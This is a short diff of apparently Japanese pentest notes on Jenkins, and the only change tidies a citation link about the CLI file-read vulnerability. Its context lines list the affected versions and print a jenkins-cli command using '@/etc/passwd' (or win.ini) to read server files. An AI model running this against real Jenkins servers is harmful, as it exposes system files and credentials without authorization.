@@ -254,7 +254,7 @@ curl -X POST \  <url>/user/<username>/descriptorByName/jenkins.security.ApiToken
 
 ※ 脆弱なバージョン:
 - Jenkins < 2.441
-- LTS < 2.426.3 ([ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2024/03/27/50773.html?utm_source=chatgpt.com "Jenkins に任意のファイルの読み取りが可能となるコマンドラインインターフェース機能におけるアクセス制御不備の脆弱性（Scan Tech Report） | ScanNetSecurity"))
+- LTS < 2.426.3 ([ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2024/03/27/50773.html))
 ```zsh
 # windowsの場合：@C:\Windows\win.ini
 java -jar jenkins-cli.jar -s <url>/ help "@/etc/passwd"
